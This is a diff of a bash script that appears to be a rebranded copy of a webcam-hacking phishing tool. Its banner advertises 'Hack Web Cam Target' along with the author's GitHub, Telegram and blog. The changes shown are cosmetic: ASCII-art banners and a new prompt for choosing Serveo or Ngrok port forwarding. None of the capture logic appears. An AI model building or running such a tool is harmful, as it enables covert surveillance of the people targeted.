@@ -1,19 +1,43 @@
-
-
-# hacked by : https://t.me/monster_hp
+#_ _  __  ___  _   _ ____ _____ _____ ____      _   _    _    ____ _  __ 
+#|  \/  |/ _ \| \ | / ___|_   _| ____|  _ \    | | | |  / \  / ___| |/ / 
+#| |\/| | | | |  \| \___ \ | | |  _| | |_) |   | |_| | / _ \| |   | ' /  
+#| |  | | |_| | |\  |___) || | | |___|  _ <    |  _  |/ ___ \ |___| . \  
+#|_|  |_|\___/|_| \_|____/ |_| |_____|_| \_\___|_| |_/_/   \_\____|_|\_\ 
+#                                         |_____|                        
+#      >>> GitHub : https://github.com/MONSTER-hp/MONSTER_HACK <<<
+#        >>> Telegram Chanell : https://t.me/MONSTER_SECURIT <<<
+#          >>> Web Sayte : www.Monster-Security.blogfa.com <<<
+#                         </> MONSTER_hp </>
 
 trap 'printf "\n";stop' 2
-
+clear
 banner() {
 
-printf "\e[91m    Hack Web Cam  Target !!! \n"
-printf " \e[1;94m GitHub : https://github.com/MONSTER-hp/MONSTER_HACK \n"
-printf " \e[1;92m Canell : https://t.me/MONSTER_SECURITY\n"
+ 
+printf "\e[1;92m
+ __  __                 _          __        __   _      ____                
+|  \/  | ___  _ __  ___| |_ ___ _ _\ \      / /__| |__  / ___|__ _ _ __ ___  
+| |\/| |/ _ \| '_ \/ __| __/ _ \ '__\ \ /\ / / _ \ '_ \| |   / _  | '_   _ |``
+| |  | | (_) | | | \__ \ ||  __/ |   \ V  V /  __/ |_) | |__| (_| | | | | | |
+|_|  |_|\___/|_| |_|___/\__\___|_|____\_/\_/ \___|_.__/ \____\__,_|_| |_| |_|
+                                |_____|                                      
+/n"
+printf "\e[1;90m    \n"
 
+printf " \e[1;91m          ===> !!! Hack Web Cam Target !!!  <===\n"
+printf " \e[95m\n"
+printf " \e[1;93m GitHub : https://github.com/MONSTER-hp/MONSTER_HACK \n"
+printf " \e[90m\n"
+printf " \e[1;96m   Telegram Chanell : https://t.me/MONSTER_SECURITY\n"
+printf " \e[90m\n"
+printf " \e[1;95m      WebSayte : WwW.MONSTER-SECURITY.blogfa.com\n"
 printf "\n"
 
 
+
+
 }
+
 
 stop() {
 
@@ -180,7 +204,7 @@ printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+read -p $'\n\e[1;92m # MONSTER_hp~> \e[1;00m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
